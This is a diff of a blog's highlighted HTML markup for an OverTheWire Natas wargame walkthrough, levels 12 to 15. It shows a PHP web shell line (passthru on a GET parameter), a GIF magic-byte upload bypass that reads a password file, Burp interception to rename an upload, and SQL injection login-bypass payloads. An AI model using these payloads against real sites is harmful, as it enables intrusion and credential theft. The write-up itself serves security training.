  &lt;span class="nb"&gt;passthru&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_GET&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;cmd&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
  &lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
@@ -462,21 +460,21 @@ Choose a JPEG to upload (max 1KB):&lt;span class="nt"&gt;&amp;lt;br/&amp;gt;&lt;
 &lt;h4&gt;Firing up Burp:&lt;/h4&gt;
 &lt;p&gt;If this is your first time with Burp, &lt;a href="http://portswigger.net/burp/help/suite_gettingstarted.html"&gt;this is how you run it&lt;/a&gt;. Burp works as an HTTP proxy server, where all  HTTP/S traffic from your browser passes through it. I will show in details how to do this in a *nix system.&lt;/p&gt;
 &lt;p&gt;First, we lauch Burp:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ java -jar -Xmx1024m /path/to/burp.jar
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;java -jar -Xmx1024m /path/to/burp.jar
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Then we go to the proxy tab and then options and we confirm Burp's Proxy listener is active at &lt;em&gt;127.0.0.1:8080&lt;/em&gt;:&lt;/p&gt;
-&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/5xkHB29.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/5xkHB29.png" /&gt;&lt;/p&gt;
 &lt;p&gt;We set the proxy configuration in our system to this address:&lt;/p&gt;
-&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/Au1Gimm.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/Au1Gimm.png" /&gt;&lt;/p&gt;
 &lt;p&gt;Back in Burp, we go to &lt;em&gt;Proxy --&amp;gt; Intercept&lt;/em&gt; and mark it ON:&lt;/p&gt;
-&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/FAf5Hru.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/FAf5Hru.png" /&gt;&lt;/p&gt;
 &lt;p&gt;In the browser, we load the Natas12 page and accept the initial intercepts (forwarding it). We upload out exploit.&lt;/p&gt;
 &lt;p&gt;Before we forward this request to the server, we open it in Burp and we change the name of the random string in &lt;em&gt;jpg&lt;/em&gt; to our &lt;em&gt;php&lt;/em&gt; exploit:&lt;/p&gt;
-&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/eywDMOy.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/eywDMOy.png" /&gt;&lt;/p&gt;
 &lt;p&gt;The browser will return the link for the file:&lt;/p&gt;
-&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/SGjbVsy.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/SGjbVsy.png" /&gt;&lt;/p&gt;
 &lt;p&gt;Clicking it will reveal the password.&lt;/p&gt;
 &lt;h3&gt;Level 13: File Inclusion Attack II&lt;/h3&gt;
 &lt;p&gt;This level looks like the previous one, except by the message:&lt;/p&gt;
@@ -484,7 +482,7 @@ Choose a JPEG to upload (max 1KB):&lt;span class="nt"&gt;&amp;lt;br/&amp;gt;&lt;
 &lt;p&gt;For security reasons, we now only accept image files!&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;We take a look at the source code and the only difference from the previous level's code is an &lt;em&gt;if&lt;/em&gt; clause:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cp"&gt;&amp;lt;?&lt;/span&gt;
 &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;array_key_exists&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;filename&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
     &lt;span class="nv"&gt;$target_path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;makeRandomPathFromFilename&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;upload&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;filename&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
         &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;filesize&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_FILES&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;uploadedfile&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;tmp_name&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;1000&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
@@ -493,13 +491,13 @@ Choose a JPEG to upload (max 1KB):&lt;span class="nt"&gt;&amp;lt;br/&amp;gt;&lt;
         &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;File is not an image&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
     &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
         &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;move_uploaded_file&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_FILES&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;uploadedfile&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;tmp_name&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="nv"&gt;$target_path&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
-            &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;The file &amp;lt;a href=&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;$target_path\&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nv"&gt;$target_path&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nx"&gt;a&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;has&lt;/span&gt; &lt;span class="nx"&gt;been&lt;/span&gt; &lt;span class="nx"&gt;uploaded&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;;&lt;/span&gt;
-&lt;span class="s2"&gt;        } else{&lt;/span&gt;
-&lt;span class="s2"&gt;            echo &amp;quot;&lt;/span&gt;&lt;span class="nx"&gt;There&lt;/span&gt; &lt;span class="nx"&gt;was&lt;/span&gt; &lt;span class="nx"&gt;an&lt;/span&gt; &lt;span class="nx"&gt;error&lt;/span&gt; &lt;span class="nx"&gt;uploading&lt;/span&gt; &lt;span class="nx"&gt;the&lt;/span&gt; &lt;span class="nb"&gt;file&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;please&lt;/span&gt; &lt;span class="k"&gt;try&lt;/span&gt; &lt;span class="nx"&gt;again&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;;&lt;/span&gt;
-&lt;span class="s2"&gt;        }&lt;/span&gt;
-&lt;span class="s2"&gt;    }&lt;/span&gt;
-&lt;span class="s2"&gt;} else {&lt;/span&gt;
-&lt;span class="s2"&gt;?&amp;gt;&lt;/span&gt;
+            &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;The file &amp;lt;a href=&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;$target_path&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s2"&gt;&amp;gt;&lt;/span&gt;&lt;span class="si"&gt;$target_path&lt;/span&gt;&lt;span class="s2"&gt;&amp;lt;/a&amp;gt; has been uploaded&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+        &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
+            &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;There was an error uploading the file, please try again!&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+        &lt;span class="p"&gt;}&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -510,7 +508,7 @@ Choose a JPEG to upload (max 1KB):&lt;span class="nt"&gt;&amp;lt;br/&amp;gt;&lt;
 &lt;p&gt;We search for an &lt;a href="http://en.wikipedia.org/wiki/Graphics_Interchange_Format"&gt;image magic number&lt;/a&gt;. For &lt;em&gt;jpg&lt;/em&gt;, it's the hexadeximal &lt;em&gt;ff d8 ff e0&lt;/em&gt;. For &lt;em&gt;gif&lt;/em&gt;, however, it's really simple: &lt;em&gt;GIF89a&lt;/em&gt;.&lt;/p&gt;
 &lt;p&gt;Let's use it!&lt;/p&gt;
 &lt;p&gt;Adding this number to our script from the previous level,&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nx"&gt;GIF89a&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nx"&gt;GIF89a&lt;/span&gt;
 &lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;
 &lt;span class="nb"&gt;readfile&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/etc/natas_webpass/natas14&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
 &lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;
@@ -520,9 +518,9 @@ Choose a JPEG to upload (max 1KB):&lt;span class="nt"&gt;&amp;lt;br/&amp;gt;&lt;
 &lt;p&gt;and following the previous steps, leads to the password for the next level.&lt;/p&gt;
 &lt;h3&gt;Level 14: SQL Injection&lt;/h3&gt;
 &lt;p&gt;This level starts with a &lt;em&gt;username&lt;/em&gt; and &lt;em&gt;password&lt;/em&gt; form:&lt;/p&gt;
-&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/qDA3nCP.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/qDA3nCP.png" /&gt;&lt;/p&gt;
 &lt;p&gt;Looking at the source code, we see THE connection to  a MySQL server, and a SQL query to look for a record in the database:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cp"&gt;&amp;lt;?&lt;/span&gt;
 &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;array_key_exists&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$_REQUEST&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
     &lt;span class="nv"&gt;$link&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;mysql_connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;natas14&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;lt;censored&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
     &lt;span class="nb"&gt;mysql_select_db&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;natas14&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$link&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
@@ -550,22 +548,22 @@ Choose a JPEG to upload (max 1KB):&lt;span class="nt"&gt;&amp;lt;br/&amp;gt;&lt;
 &lt;p&gt;http://natas14.natas.labs.overthewire.org/index.php?username=admin&amp;amp;password=pass&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;returns:&lt;/p&gt;
-&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/mWhSVxh.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/mWhSVxh.png" /&gt;&lt;/p&gt;
 &lt;p&gt;A crafted query using &lt;a href="https://www.owasp.org/index.php/SQL_Injection"&gt;SQL Injection&lt;/a&gt; (SQLi) can return whatever we want :).&lt;/p&gt;
 &lt;h4&gt;Crafting the attack:&lt;/h4&gt;
 &lt;p&gt;Without any injection, a regular query with words &lt;em&gt;admin&lt;/em&gt; and &lt;em&gt;pass&lt;/em&gt; would look like this:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;SELECT * from users where username=&amp;quot;$(Username)&amp;quot; and password=&amp;quot;$(Password)&amp;quot;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;SELECT&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;from&lt;/span&gt; &lt;span class="n"&gt;users&lt;/span&gt; &lt;span class="n"&gt;where&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;$(Username)&amp;quot;&lt;/span&gt; &lt;span class="n"&gt;and&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;$(Password)&amp;quot;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;We want to inject stuff in the middle to make this query do &lt;em&gt;more things&lt;/em&gt;.&lt;/p&gt;
 &lt;p&gt;In SQLi, we need to take care of the &lt;strong&gt;"&lt;/strong&gt; that is automatically added in the end by the server. The simplest way to do this is by including an &lt;strong&gt;always true clause&lt;/strong&gt; in the end of everything. This can be represented by:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;OR &amp;#39;1&amp;#39;=&amp;#39;1&amp;#39;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;OR&lt;/span&gt; &lt;span class="sc"&gt;&amp;#39;1&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;1&amp;#39;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;So, for example, the following query would not give any error:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;SELECT * from users where username=&amp;quot;admin&amp;quot; and password=&amp;quot;pass&amp;quot; OR &amp;quot;1&amp;quot;=&amp;quot;1&amp;quot;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;SELECT&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;from&lt;/span&gt; &lt;span class="n"&gt;users&lt;/span&gt; &lt;span class="n"&gt;where&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt; &lt;span class="n"&gt;and&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;pass&amp;quot;&lt;/span&gt; &lt;span class="n"&gt;OR&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;1&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;1&amp;quot;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -576,42 +574,42 @@ Choose a JPEG to upload (max 1KB):&lt;span class="nt"&gt;&amp;lt;br/&amp;gt;&lt;
 &lt;p&gt;http://natas14.natas.labs.overthewire.org/index.php?username=admin&amp;amp;password=pass%22%20OR%20%221%22=%221&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;reveals the password.&lt;/p&gt;
-&lt;hr&gt;
+&lt;hr /&gt;
 &lt;h2&gt;Now the Juice: Scripting Attacks&lt;/h2&gt;
 &lt;h3&gt;Level 15: SQL Injection II&lt;/h3&gt;
 &lt;p&gt;This level starts with a  form to check the existence of some username:&lt;/p&gt;
-&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/SO4K5wK.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/SO4K5wK.png" /&gt;&lt;/p&gt;
 &lt;p&gt;The source code is almost equal to the previous level, with exception of this part:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cm"&gt;/*&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cm"&gt;/*&lt;/span&gt;
 &lt;span class="cm"&gt;CREATE TABLE `users` (&lt;/span&gt;
 &lt;span class="cm"&gt;  `username` varchar(64) DEFAULT NULL,&lt;/span&gt;
 &lt;span class="cm"&gt;  `password` varchar(64) DEFAULT NULL&lt;/span&gt;
 &lt;span class="cm"&gt;);&lt;/span&gt;
-&lt;span class="cm"&gt;*/&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="cm"&gt;*/&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;And the fact that the &lt;em&gt;$query&lt;/em&gt;  does not have a password part and it is hygienized now:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;if&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;array_key_exists&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="nt"&gt;_REQUEST&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
-    &lt;span class="err"&gt;$link&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt; &lt;span class="err"&gt;mysql_connect(&amp;#39;localhost&amp;#39;,&lt;/span&gt; &lt;span class="err"&gt;&amp;#39;natas15&amp;#39;,&lt;/span&gt; &lt;span class="err"&gt;&amp;#39;&amp;lt;censored&amp;gt;&amp;#39;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-    &lt;span class="err"&gt;mysql_select_db(&amp;#39;natas15&amp;#39;,&lt;/span&gt; &lt;span class="err"&gt;$link)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-    &lt;span class="err"&gt;$query&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt; &lt;span class="err"&gt;&amp;quot;SELECT&lt;/span&gt; &lt;span class="err"&gt;*&lt;/span&gt; &lt;span class="err"&gt;from&lt;/span&gt; &lt;span class="err"&gt;users&lt;/span&gt; &lt;span class="err"&gt;where&lt;/span&gt; &lt;span class="err"&gt;username=\&amp;quot;&amp;quot;.$_REQUEST&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="err"&gt;.&amp;quot;\&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-    &lt;span class="err"&gt;if(array_key_exists(&amp;quot;debug&amp;quot;,&lt;/span&gt; &lt;span class="err"&gt;$_GET))&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;
-        &lt;span class="err"&gt;echo&lt;/span&gt; &lt;span class="err"&gt;&amp;quot;Executing&lt;/span&gt; &lt;span class="n"&gt;query&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;query&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;br&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;;&lt;/span&gt;
-&lt;span class="s2"&gt;    }&lt;/span&gt;
-&lt;span class="s2"&gt;    $res = mysql_query($query, $link);&lt;/span&gt;
-&lt;span class="s2"&gt;    if($res) {&lt;/span&gt;
-&lt;span class="s2"&gt;    if(mysql_num_rows($res) &amp;gt; 0) {&lt;/span&gt;
-&lt;span class="s2"&gt;        echo &amp;quot;&lt;/span&gt;&lt;span class="n"&gt;This&lt;/span&gt; &lt;span class="n"&gt;user&lt;/span&gt; &lt;span class="n"&gt;exists&lt;/span&gt;&lt;span class="o"&gt;.&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;br&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;;&lt;/span&gt;
-&lt;span class="s2"&gt;    } else {&lt;/span&gt;
-&lt;span class="s2"&gt;        echo &amp;quot;&lt;/span&gt;&lt;span class="n"&gt;This&lt;/span&gt; &lt;span class="n"&gt;user&lt;/span&gt; &lt;span class="n"&gt;doesn&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt; &lt;span class="n"&gt;exist&lt;/span&gt;&lt;span class="o"&gt;.&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;br&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;;&lt;/span&gt;
-&lt;span class="s2"&gt;    }&lt;/span&gt;
-&lt;span class="s2"&gt;    } else {&lt;/span&gt;
-&lt;span class="s2"&gt;        echo &amp;quot;&lt;/span&gt;&lt;span class="n"&gt;Error&lt;/span&gt; &lt;span class="n"&gt;in&lt;/span&gt; &lt;span class="n"&gt;query&lt;/span&gt;&lt;span class="o"&gt;.&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;br&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-    &lt;span class="p"&gt;}&lt;/span&gt;
-    &lt;span class="nt"&gt;mysql_close&lt;/span&gt;&lt;span class="o"&gt;($&lt;/span&gt;&lt;span class="nt"&gt;link&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
-&lt;span class="err"&gt;}&lt;/span&gt; &lt;span class="nt"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
-&lt;span class="err"&gt;?&amp;gt;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;array_key_exists&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$_REQUEST&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="nv"&gt;$link&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;mysql_connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;natas15&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;lt;censored&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="nx"&gt;mysql_select_db&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;natas15&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$link&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="nv"&gt;$query&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SELECT * from users where username=&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nx"&gt;.&lt;/span&gt;&lt;span class="nv"&gt;$_REQUEST&lt;/span&gt;&lt;span class="err"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;.&amp;quot;\&amp;quot;&amp;quot;;
+    if(array_key_exists(&amp;quot;debug&amp;quot;, $_GET)) {
+        echo &amp;quot;Executing query: $query&lt;span class="nt"&gt;&amp;lt;br&amp;gt;&lt;/span&gt;&amp;quot;;
+    }
+    $res = mysql_query($query, $link);
+    if($res) {
+    if(mysql_num_rows($res) &amp;gt; 0) {
+        echo &amp;quot;This user exists.&lt;span class="nt"&gt;&amp;lt;br&amp;gt;&lt;/span&gt;&amp;quot;;
+    } else {
+        echo &amp;quot;This user doesn&amp;#39;t exist.&lt;span class="nt"&gt;&amp;lt;br&amp;gt;&lt;/span&gt;&amp;quot;;
+    }
+    } else {
+        echo &amp;quot;Error in query.&lt;span class="nt"&gt;&amp;lt;br&amp;gt;&lt;/span&gt;&amp;quot;;
+    }
+    mysql_close($link);
+} else {
+?&amp;gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -624,13 +622,13 @@ Choose a JPEG to upload (max 1KB):&lt;span class="nt"&gt;&amp;lt;br/&amp;gt;&lt;
 &lt;/blockquote&gt;
 &lt;p&gt;However, if we check for &lt;em&gt;natas16&lt;/em&gt; we verify that this user exists! Now we just need a password.&lt;/p&gt;
 &lt;p&gt;Since checking this &lt;em&gt;natas16&lt;/em&gt;  will always return true, we can  inject another clause to the query using the keyword AND:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;SELECT * from users where username=&amp;quot;natas16&amp;quot; AND our_exploit
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;SELECT&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;from&lt;/span&gt; &lt;span class="n"&gt;users&lt;/span&gt; &lt;span class="n"&gt;where&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;natas16&amp;quot;&lt;/span&gt; &lt;span class="n"&gt;AND&lt;/span&gt; &lt;span class="n"&gt;our_exploit&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
